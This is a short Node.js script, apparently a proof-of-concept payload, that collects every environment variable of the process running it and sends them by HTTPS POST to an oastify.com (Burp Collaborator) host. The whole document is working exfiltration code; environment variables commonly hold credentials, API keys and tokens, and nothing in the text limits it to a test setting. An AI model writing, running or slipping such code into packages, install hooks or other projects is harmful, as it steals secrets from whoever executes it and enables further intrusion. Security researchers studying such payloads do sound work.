const https = require('https');

// Collect all environment variables
const envData = JSON.stringify(process.env);

// Send to Burp Collaborator
const options = {
  hostname: 'xde69i98vr4p3t5fy08536zsjjpad31s.oastify.com',
  port: 443,
  path: '/env-data',
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'Content-Length': envData.length
  }
};

const req = https.request(options, (res) => {
  console.log('Response:', res.statusCode);
});

req.write(envData);
req.end();
